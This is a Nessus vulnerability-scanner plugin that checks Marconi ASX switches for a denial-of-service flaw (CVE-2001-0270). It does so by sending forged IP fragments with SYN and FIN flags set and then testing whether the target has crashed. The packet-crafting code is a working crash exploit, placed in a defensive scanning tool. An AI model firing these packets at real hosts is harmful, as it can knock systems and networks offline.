#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10635);
 script_bugtraq_id(2400);
 script_version ("$Revision: 1.11 $");
 script_cve_id("CVE-2001-0270");
 name["english"] = "Marconi ASX DoS";
 name["francais"] = "Marconi ASX DoS";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible
to make the remote server crash
using the 'marconi dos' attack. 

An attacker may use this flaw to
shut down this host, thus 
preventing your network from
working properly.

Solution : contact your operating
system vendor for a patch.

Risk factor : High";


 desc["francais"] = "Il s'est avéré
possible de tuer la machine distante 
en utilisant l'attaque 'marconis dos'.

Un pirate peut utiliser cette
attaque pour empecher votre
réseau de fonctionner normallement.

Solution : contactez le vendeur
de votre OS pour un patch.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote host using the 'marconi dos' attack";
 summary["francais"] = "Tue le serveur distant en utilisant l'attaque 'marconi dos'";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 
 exit(0);
}

#
# The script code starts here
#

addr = get_host_ip();
ip = forge_ip_packet(   ip_v : 4,
			ip_hl : 5,
			ip_tos : 0,
			ip_len : 20,
		        ip_id : rand(),
			ip_p : IPPROTO_TCP,
			ip_ttl : 255,
		        ip_off : IP_MF,
			ip_src : addr);
port = get_host_open_port();
if(!port)exit(0);
			
tcpip = forge_tcp_packet(    ip	      : ip,
			     th_sport : rand() % 65535,    
			     th_dport : port,   
			     th_flags : TH_SYN|TH_FIN,
		             th_seq   : rand(),
			     th_ack   : 0,
			     th_x2    : 0,
		 	     th_off   : 5,     
			     th_win   : 512, 
			     th_urp   : 0);

#
# Ready to go...
#
			 
start_denial();
send_packet(tcpip, pcap_active:FALSE) x 5;
sleep(5);
alive = end_denial();
if(!alive){
		set_kb_item(name:"Host/dead", value:TRUE);
		security_hole(0);
		}
